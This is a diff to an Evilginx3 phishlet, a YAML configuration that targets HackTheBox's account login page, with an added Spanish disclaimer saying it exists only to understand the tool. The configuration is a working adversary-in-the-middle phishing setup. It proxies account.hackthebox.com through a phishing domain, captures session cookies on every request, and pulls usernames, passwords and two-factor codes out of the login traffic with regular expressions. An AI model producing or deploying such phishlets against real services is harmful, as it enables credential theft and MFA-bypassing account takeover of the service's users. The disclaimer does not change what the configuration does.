@@ -1,3 +1,6 @@
+## Estos phishlets solo estan realizados con el fin de entender la tool de evilginx3 y no realizar ataques sobre los mismos
+
+
 name: 'hackthebox'
 author: 'Alux'
 min_ver: '3.0.0'
@@ -6,8 +9,8 @@ redirect_url: 'https://account.phishing.local/dashboard'
 proxy_hosts:
   - {phish_sub: 'account', orig_sub: 'account', domain: 'hackthebox.com', session: true, is_landing: true, auto_filter: true}
 auth_tokens:
-  - domain: '.account.hackthebox.com'
-    keys: ['XSRF-TOKEN','hack_the_box_session']
+  - domain: 'account.hackthebox.com'
+    keys: ['XSRF-TOKEN:always','hack_the_box_session:always']
     type: 'cookie'
 credentials:
   username:
@@ -18,7 +21,7 @@ credentials:
     key: ''
     search: '"password":"([^"]*)'
     type: 'json'
-  custom:
+  code:
     key: ''
     search: '"code":"([^"]*)'
     type: 'json'
